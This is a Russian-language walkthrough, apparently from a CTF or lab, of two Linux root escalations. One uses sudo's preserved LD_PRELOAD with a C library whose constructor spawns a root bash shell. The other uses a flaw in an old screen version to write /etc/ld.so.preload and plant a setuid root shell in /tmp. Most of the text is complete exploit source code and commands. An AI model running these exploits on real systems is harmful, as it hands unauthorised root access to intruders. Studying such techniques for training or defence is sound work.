## LD_PRELOAD через sudo

Заходим на сервер, сразу пытаемся посмотреть sudo -l, видим env_keep+=LD_PRELOAD и (ALL : ALL) NOPASSWD: /opt/process_logs.sh, значит пользователь может сначала скомпилить библиотеку под с чтобы она потом загружалась при LD_PRELOAD, а запуск с sudo без пароля скрипта process_logs.sh позволит библиотеке подгрузиться с повышенными привилегиями

Сначала пишем сишную библиотеку:
```c
cat > program2.c <<'EOF'  
#include <stdio.h>  
#include <unistd.h>  
#include <stdlib.h>  
  
__attribute__((constructor))  
static void init_hook(void) {  
   if (geteuid() != 0) return;    
   unsetenv("LD_PRELOAD");    
   setuid(0);  
   setgid(0);  
   system("/bin/bash -i");  
}  
EOF
```

потом компилим её:
`gcc -fPIC -shared program2.c -o program2.so`

и передаём её в LD_PRELOAD при запуске скрипта от рута:
`sudo LD_PRELOAD=./program2.so /opt/process_logs.sh`

Всё, мы под рутом

## Старый screen

Цвешка позволяет записать в любой файл произвольную строку, поэтому сделаем два скрипта - один который будет сам запускать шелл, а второй будет выдавать рутовские права этому скрипту. Это нужно потому что уязва добавляет наш скрипт в прелоад, а прелоад будет отрабатывать при любом запуске динамического бинарника, поэтому мы сделаем скрипт который один раз отработает, даст первому скрипту рутовский доступ, и перестанет отрабатывать:
```c
cat << EOF > /tmp/libhax.c  
#include <stdio.h>  
#include <sys/types.h>  
#include <sys/stat.h>  
#include <unistd.h>  
  
__attribute__ ((__constructor__))  
void dropshell(void){  
   chown("/tmp/rootshell", 0, 0);  
   chmod("/tmp/rootshell", 04755);  
   unlink("/etc/ld.so.preload");  
   printf("+");  
}  
EOF
```

Также сделаем сам скрипт:
```c
cat << EOF > /tmp/rootshell.c  
#include <stdio.h>  
#include <unistd.h>  
  
int main(void){  
   setuid(0);  
   setgid(0);  
   seteuid(0);  
   setegid(0);  
   char *argv[] = {"/bin/sh", NULL};  
   execvp("/bin/sh", argv);  
   return 0;  
}  
EOF
```

Скомпилируем бинарник для запуска шелла и библиотеку:
```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
gcc -o /tmp/rootshell /tmp/rootshell.c
```

Используем уязвимость:
```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```
Заходим под шеллом: 
`/tmp/rootshell`
